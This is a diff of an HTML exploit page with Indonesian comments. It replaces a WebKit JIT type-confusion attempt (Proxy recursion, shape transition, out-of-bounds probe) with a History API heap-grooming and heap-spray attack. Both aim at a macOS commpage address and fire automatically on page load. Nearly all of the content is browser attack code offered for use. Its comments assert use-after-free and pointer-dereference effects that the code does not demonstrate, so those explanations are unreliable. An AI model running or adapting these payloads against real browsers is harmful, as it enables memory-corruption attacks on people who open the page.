@@ -1,135 +1,123 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JIT Desync: Proxy Recursion</title>
+    <title>History API State Corruption Attack</title>
 </head>
 <body>
 
-    <h1>JIT Desynchronization (Watchpoint Bypass)</h1>
-    <p>Target Address: 0x0000000FFFFFC320</p>
-    <div id="status">INIT: Mempersiapkan JIT Trap...</div>
-    <div id="log-area" style="border:1px solid #333; background:#000; color:#0f0; padding:10px; font-family:monospace; height:400px; overflow:scroll;"></div>
+    <h1>History API State Corruption (Commpage Target)</h1>
+    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
+    <p id="status">INIT: Mempersiapkan Serangan History API...</p>
+    <div id="log-area"></div>
 
     <script>
-        const LOG = document.getElementById('log-area');
-        function log(msg) {
-            LOG.innerHTML += `<div>> ${msg}</div>`;
-            LOG.scrollTop = LOG.scrollHeight;
-        }
-
-        // --- 1. SETUP TARGET POINTER ---
-        // Kita gunakan ArrayBuffer View.
-        // Jika JIT salah hitung offset, dia akan membaca pointer ini sebagai alamat memori.
-        const TARGET_ADDR_LOW = 0xFFFFC320; // Bagian bawah alamat Commpage
-        const TARGET_ADDR_HIGH = 0x0000000F; // Bagian atas
-
-        // --- 2. THE BUTTERFLY CONFUSION SETUP ---
-        // WebKit menyimpan properti objek di tempat bernama "Butterfly".
-        // Kita ingin menukar Butterfly Double (angka) dengan Butterfly Pointer (objek).
+        // --- KONSTANTA COMM PAGE ---
+        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
+        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
+        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
-        let confusionBuffer = new ArrayBuffer(8);
-        let floatView = new Float64Array(confusionBuffer);
-        let uintView = new Uint32Array(confusionBuffer);
+        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
-        // Masukkan alamat target ke dalam format float
-        uintView[0] = TARGET_ADDR_LOW;
-        uintView[1] = TARGET_ADDR_HIGH;
-        const POISON_FLOAT = floatView[0]; // Ini adalah alamat memori yang menyamar jadi angka
+        let startTime = performance.now();
+        let payloadHolders = []; 
+        let historyStates = []; // Menyimpan referensi state
 
-        // --- 3. THE RECURSIVE TRAP ---
-        let depth = 0;
-        const MAX_DEPTH = 10000; // Cukup dalam untuk mendekati Stack Overflow
-        let victim = { x: 1.1, y: 2.2 }; // Objek awal (Double shape)
-
-        const handler = {
-            get: function(target, prop, receiver) {
-                if (prop === 'y') {
-                    depth++;
-                    // RECURSION BOMB
-                    // Kita memakan stack space sampai habis
-                    if (depth < MAX_DEPTH) {
-                        // Terus panggil properti ini secara rekursif
-                        return receiver[prop]; 
-                    } 
-                    
-                    // --- TITIK KRITIS (CRITICAL POINT) ---
-                    // Saat stack hampir meledak, kita ubah bentuk objek 'victim'.
-                    // Dari menyimpan Angka (Double) menjadi menyimpan Objek (Contiguous).
-                    // JIT yang sedang berjalan di luar sana masih mengira ini Angka.
-                    
-                    log("⚡ TRAP ACTIVE: Mengubah struktur memori di kedalaman " + depth);
-                    
-                    // Transisi bentuk objek (Shape Transition)
-                    victim.x = { a: 1 }; // Ubah x jadi objek
-                    victim.y = POISON_FLOAT; // Masukkan racun kita di y
-                    
-                    // Paksa Garbage Collection untuk membersihkan jejak lama
-                    try { new ArrayBuffer(10*1024*1024); } catch(e){}
-                    
-                    return POISON_FLOAT;
-                }
-                return Reflect.get(target, prop, receiver);
-            }
-        };
-
-        const proxy = new Proxy(victim, handler);
-
-        // --- 4. FUNGSI OPTIMASI JIT ---
-        // Ini adalah fungsi yang akan dikompilasi oleh JIT (DFG/FTL)
-        // JIT akan melihat 'o.y' selalu mengembalikan angka, jadi dia menghilangkan type check.
-        function optimizeMe(o) {
-            // Operasi matematika memaksa JIT memperlakukan nilai sebagai angka
-            // Jika o.y ternyata adalah POINTER (karena desync), ini akan jadi pointer dereference.
-            return o.y + 1.0; 
+        function log(message, type = 'log-info') {
+            const timeElapsed = (performance.now() - startTime).toFixed(2);
+            const logElement = document.getElementById('log-area');
+            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
+            logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- 5. EKSEKUSI ---
-        async function runExploit() {
-            log("Phase 1: Training JIT Compiler...");
-            
-            // Latih JIT agar percaya bahwa 'victim' selalu berisi angka (Double)
-            for (let i = 0; i < 10000; i++) {
-                optimizeMe({ x: 1.1, y: 2.2 });
-            }
-            
-            log("Phase 2: JIT Terlatih. Mengaktifkan Proxy Bomb...");
-            
-            // Berikan jeda agar JIT selesai optimasi background
-            await new Promise(r => setTimeout(r, 100));
+        // --- FUNGSI HEAP SPRAY PAYLOAD ---
+        function sprayPayload() {
+            log("Memulai Spraying Payload...", "log-spray");
+            const SPRAY_COUNT = 1500;
+            const PAYLOAD_SIZE = 64; 
 
-            try {
-                // PANGGILAN MAUT
-                // Kita kirim Proxy ke fungsi yang sudah dioptimasi.
-                // Proxy akan memicu trap -> recursion -> shape change -> desync -> crash
-                let result = optimizeMe(proxy);
-                
-                log("Result: " + result);
-                if (result === POISON_FLOAT + 1.0) {
-                    log("⚠️ GAGAL: Nilai dibaca sebagai angka biasa.");
-                } else {
-                    log("❓ ANOMALI: Hasil tidak terduga, cek logs sistem.");
-                }
-                
-            } catch (e) {
-                // Stack Overflow error diharapkan, tapi kita berharap crash memori terjadi SEBELUM error ini ditangkap.
-                log("Caught Expected Error: " + e.message);
-                if (e.message.includes("stack")) {
-                    log("🔥 STACK OVERFLOW TERJADI. Jika tidak crash, mitigasi Stack Check berhasil.");
-                }
+            for (let i = 0; i < SPRAY_COUNT; i++) {
+                let payloadArray = new Float64Array(PAYLOAD_SIZE);
+                payloadArray[0] = HIGH_WORD; 
+                payloadArray[1] = LOW_WORD;
+                payloadArray[2] = 2031.0 + i; 
+                payloadHolders.push(payloadArray); 
             }
-            
-            // --- 6. SECONDARY TRIGGER (Array OOB via Desync) ---
-            log("Phase 3: Mencoba Array Length Confusion...");
-            // Jika desync terjadi tapi tidak crash, mungkin heap structure rusak.
-            // Coba akses array besar.
-            let arr = new Array(100);
-            arr.fill(1.1);
-            // Coba akses di luar batas jika length pointer rusak
-            log("Probe OOB: " + arr[1000]); 
         }
 
-        setTimeout(runExploit, 1000);
+        // --- FUNGSI UTAMA ATTACK ---
+        function runHistoryAttack() {
+            startTime = performance.now();
+            log("Phase 1: Melakukan Heap Grooming dengan History State.", "log-init");
 
+            const HISTORY_COUNT = 100;
+            const STATE_ARRAY_SIZE = 1024 * 1024; // State 4MB (cukup besar untuk fragmentasi heap)
+            
+            // 1. Fragmentasi Heap dengan History State
+            for (let i = 0; i < HISTORY_COUNT; i++) {
+                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
+                // Isi array dengan nilai yang unik
+                stateArray.fill(0xFEEDFACE + i);
+                
+                // Gunakan pushState untuk menyimpan objek yang besar dan kompleks
+                // Ini memaksa serialization dan alokasi memori C++ di History Cache
+                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
+                historyStates.push(stateArray);
+            }
+            log(`Phase 2: ${HISTORY_COUNT} History State Besar diserialisasi.`, "log-info");
+
+            // 2. Memicu Corrupt State
+            // Kita coba kembali ke state yang sangat tua, berharap memuat ulang objek yang sudah fragmentasi
+            window.history.go(-HISTORY_COUNT + 1);
+            log("Phase 3: Navigasi cepat ke History State awal.", "log-critical");
+
+            // 3. FREE/SPRAY Race
+            // Kita segera membersihkan referensi JavaScript dan melakukan spray
+            // Ini menciptakan UAF di History Cache C++
+            setTimeout(() => {
+                log("Phase 4: Memicu FREE/SPRAY...", "log-critical");
+                
+                // Hapus semua referensi JS (memaksa GC)
+                historyStates = null;
+                
+                // Lakukan Spray Payload
+                sprayPayload(); 
+                
+                // 4. Trigger Eksploitasi: Memicu Pemanggilan State Corrupt
+                // Coba navigasi cepat lagi. WebKit harus membaca objek state yang sudah ditimpa
+                
+                // Menggunakan pushState lagi setelah spray akan mencoba menulis ke lokasi yang sama.
+                let attackerState = new Float64Array(1024); // Array kecil untuk pemicu
+                attackerState.fill(HIGH_WORD);
+                window.history.pushState({ trigger: attackerState }, 'Attack', '#attack');
+
+                log("Phase 5: Navigasi/pushState Attacker. Menunggu Crash Implisit.", "log-critical");
+            }, 100); 
+            
+            // Trigger alternatif: Memicu GC agresif untuk membersihkan History Cache
+            setTimeout(() => {
+                // Tidak ada cara langsung, jadi kita alokasikan banyak memori lagi
+                for(let i = 0; i < 50; i++) {
+                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF); // 5MB x 50 = 250MB filler
+                }
+                log("Trigger GC Implisit selesai.", "log-info");
+            }, 200);
+        }
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('status').textContent = 'Memulai rangkaian History API Attack...';
+            setTimeout(runHistoryAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah State Corruption.';
+        });
     </script>
+    <style>
+        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
+        .log-init { color: blue; }
+        .log-info { color: black; }
+        .log-spray { color: purple; }
+        .log-critical { color: red; font-weight: bold; }
+        .log-success { color: green; font-weight: bold; }
+    </style>
 </body>
 </html>
